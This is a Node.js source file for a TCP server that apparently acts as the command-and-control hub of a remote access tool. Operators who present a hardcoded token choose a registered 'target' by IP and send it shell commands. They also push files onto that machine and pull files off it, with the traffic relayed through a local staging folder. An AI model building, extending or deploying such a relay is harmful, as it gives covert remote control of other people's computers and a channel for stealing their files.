const net = require("net")
const fs = require("fs")
const path = require("path")
const server = net.createServer()
const PORT = 3000
const rootToken = "mYR2fOv3SDjA9"
server.listen(PORT,()=>{
    console.log("Run server")
})
let targetClientList = []

let rootUserList = []
let sendfileFLG = "cmd"
let sendfileType = ""
let sendfileName = ""
let sendfilePath = ""
let uploadFile = ""
const filesdir = "./dls"
const filesname = "upload"
let dlfileData = {gpath:"",name:""}
let rootUserSocket;

server.on("connection",(socket)=>{
    let connectionIP = ""
    let myID = ""
    let targetToken = ""
    let filesize = 0
    let byteList = []
    socket.on("data",(data)=>{
        try{
            if(sendfileFLG == "cmd"){
            if(JSON.parse(data).type == "sendUserType"){
                console.log("kkkkk")
                    if(JSON.parse(data).token == rootToken){
                        rootUserList.push({Name:"client:"+rootUserList.length,socket:socket})
                        myID = rootUserList[rootUserList.length-1].Name/*+rootUserList.length-1*/
                        const sendData = JSON.stringify({type:"sendClient",data:targetClientList})
                        socket.write(sendData)
                    }else{
                        let co = false
                        targetClientList.forEach((i)=>{
                            if(i.ip == JSON.parse(data).IP){
                                co = true
                            }
                        })
                        if(!co){
                            targetToken = JSON.parse(data).IP
                            targetClientList.push({ip:JSON.parse(data).IP,socket:socket})
                        }
                    }
                    console.log(targetClientList)
                    console.log(rootUserList)
                }else if(JSON.parse(data).type == "setTargetIp"){
                    connectionIP = JSON.parse(data).data
                    console.log(connectionIP)
                    const sendData = JSON.stringify({type:"conTargetComplete",data:connectionIP})
                    socket.write(sendData)
                }else if(JSON.parse(data).type == "runCommand"){
                    const getData = JSON.parse(data)
                    console.log(getData.data)
                    if(getData.data == "hs exit"){

                    }else{
                        let co = null
                        for(let i = 0;targetClientList.length>i;i++){
                            if(targetClientList[i].ip == connectionIP){
                                co = i
                            }
                        }
                        if(co != null){
                            const sendData = JSON.stringify({type:"runCommand",data:getData.data,rootUser:myID})
                            targetClientList[co].socket.write(sendData)
                        }else{
                            const sendData = JSON.stringify({type:"noClient",data:""})
                            socket.write(sendData)
                        }
                    }
                }else if(JSON.parse(data).type == "sendComandRes"){
                    const getData = JSON.parse(data)
                    let rootUserSocket = null
                    rootUserList.forEach((i)=>{
                        rootUserSocket = i.socket
                    })
                    const sendData = JSON.stringify({type:"resposeLog",data:getData.data.toString("utf-8")})
                    rootUserSocket.write(sendData)
                }else if(JSON.parse(data).type == "sendComandResList"){
                    const getData = JSON.parse(data)
                    let rootUserSocket = null
                    rootUserList.forEach((i)=>{
                        rootUserSocket = i.socket
                    })
                    const sendData = JSON.stringify({type:"resposeLogList",data:getData.data})
                    rootUserSocket.write(sendData)
                }else if(JSON.parse(data).type == "fileType"){
                    sendfileFLG = "ufile"
                    byteList = []
                    filesize = JSON.parse(data).data.size
                    byteList = []
                    sendfileType = JSON.parse(data).data.type
                    sendfileName = JSON.parse(data).data.name
                    sendfilePath = JSON.parse(data).data.path
                }else if(JSON.parse(data).type == "uploadfileDone"){
                    let rootUserSocket = null
                    rootUserList.forEach((i)=>{
                        rootUserSocket = i.socket
                    })
                    let sendData = JSON.stringify({type:"uploadDone"})
                    rootUserSocket.write(sendData)
                    // try{
                    //     fs.unlink(uploadFile,(error)=>{
                    //         console.log("delete backup")
                    //     })
                    // }catch{}
                }else if(JSON.parse(data).type == "uploadfileError"){
                    let rootUserSocket = null
                    rootUserList.forEach((i)=>{
                        rootUserSocket = i.socket
                    })
                    let sendData = JSON.stringify({type:"uploadError"})
                    rootUserSocket.write(sendData)
                }else if(JSON.parse(data).type == "fileData"){
                    rootUserSocket = null
                    rootUserSocket = socket
                    const data1 = JSON.parse(data).data
                    dlfileData.gpath = data1.gpath
                    dlfileData.name = data1.name
                    let co = null
                    for(let i = 0;targetClientList.length>i;i++){
                        if(targetClientList[i].ip == connectionIP){
                            co = i
                        }
                    }
                    const sendData = JSON.stringify({type:"downloadFileData",dpath:data1.dpath,gpath:data1.gpath})
                    targetClientList[co].socket.write(sendData)
                }else if(JSON.parse(data).type == "downloaderror"){
                    let rootUserSocket = null
                    rootUserList.forEach((i)=>{
                        rootUserSocket = i.socket
                    })
                    let sendData = JSON.stringify({type:"downloadError"})
                    rootUserSocket.write(sendData)
                }else if(JSON.parse(data).type == "setFileSize"){
                    let data1 = JSON.parse(data).data
                    filesize = data1
                    console.log(filesize)
                    sendfileFLG = "dfile"
                    byteList = []
                }
            }else if(sendfileFLG == "ufile"){
                console.log("popojijio")
                byteList.push(data)
                let nowFile = Buffer.concat(byteList)
                let nowSize = nowFile.length
                console.log(nowSize)
                console.log(filesize)
                if(filesize <= nowSize){
                    sendfileFLG = "cmd"
                    try{
                        let file = path.join(filesdir,`${filesname}.${sendfileType}`)
                        uploadFile = `${filesdir}/${filesname}.${sendfileType}`
                        console.log(uploadFile)
                        let sendFile = null
                        let ufstream = fs.createWriteStream(file)
                        ufstream.write(nowFile)
                        ufstream.end((err)=>{
                            console.log("111")
                            if(err){
                                console.log("error")
                                const sendData = JSON.stringify({type:"sendfileError",data:""})
                                socket.write(sendData)

                            }else{
                                console.log("done")

                                sendFile = fs.createReadStream(`${filesdir}/${filesname}.${sendfileType}`)
                                let co = null
                                for(let i = 0;targetClientList.length>i;i++){
                                    if(targetClientList[i].ip == connectionIP){
                                        co = i
                                    }
                                }
                                const sendData = JSON.stringify({type:"sendFileType",data:{type:sendfileType,name:sendfileName,path:sendfilePath,size:filesize}})
                                try{
                                    targetClientList[co].socket.write(sendData)
                                }catch{

                                }
                                if(co != null){
                                    console.log("222")
                                    sendFile.pipe(targetClientList[co].socket,{end:false})
                                    sendFile.on("error",()=>{
                                        console.log("senderror")
                                    })
                                }
                                sendfileFLG = "cmd"

                            }  
                        })

                    }catch{}
                }
            }else if(sendfileFLG == "dfile"){
                byteList.push(data)
                let nowFile = Buffer.concat(byteList)
                let nowSize = nowFile.length
                console.log(nowFile)
                if(nowSize >= filesize){
                    // console.log("aaaaaaaaaaaaaaa")
                    console.log(dlfileData)
                    sendfileFLG = "cmd"
                    let type = dlfileData.name.split(".")
                    let filepath = path.join(filesdir,`${filesname}.${type[1]}`)
                    let file = null
                    let dlstream = fs.createWriteStream(filepath)
                    dlstream.write(nowFile)
                    dlstream.end((err)=>{
                        console.log("endwrite")
                        if(err){
                            let sendData = JSON.stringify({type:"downloadError"})
                            rootUserSocket.write(sendData)
                        }else{
                            console.log("download done")
                            console.log(filesize)
                            const sendFile2 = JSON.stringify({type:"dfFileSize",data:filesize})
                            rootUserSocket.write(sendFile2)
                            
                            file = fs.createReadStream(`${filesdir}/${filesname}.${type[1]}`)
                            file.pipe(rootUserSocket,{end:false})
                            file.on("error",()=>{
                                let sendData = JSON.stringify({type:"downloadError"})
                                rootUserSocket.write(sendData)
                            })
                        }
                    })
                }else{

                }
            }
            // }else{
            //     console.log("flflkop")
            // }
        }catch{
            // console.log("error")
        }
    })
        socket.on('close', () => {
            console.log("close")
            if(myID && connectionIP){
                rootUserList.forEach((i,index)=>{
                    console.log(i)
                    if(i.Name == myID){
                        let tag = null
                        targetClientList.forEach((i)=>{
                            if(i.ip == connectionIP){
                                tag = i
                            }
                        })
                        if(tag){
                            tag.socket.write(JSON.stringify({type:"endClient",data:myID}))
                        }
                        rootUserList.splice(index,1)
                        console.log(rootUserList.length)

                    }
                })
            }else if(myID){
                console.log("pppp")
                rootUserList.forEach((i,index)=>{
                    if(i.Name == myID){
                        rootUserList.splice(index,1)
                    }
                })
            }else if(targetToken){
                targetClientList.forEach((i,index)=>{
                    if(i.ip == targetToken){
                        targetClientList.splice(index,1)
                        console.log(targetClientList)
                    }
                })
            }
        });
    
      // エラーが発生した場合の処理
      socket.on('error', (err) => {
        console.error('Socket error:', err);
      });
})
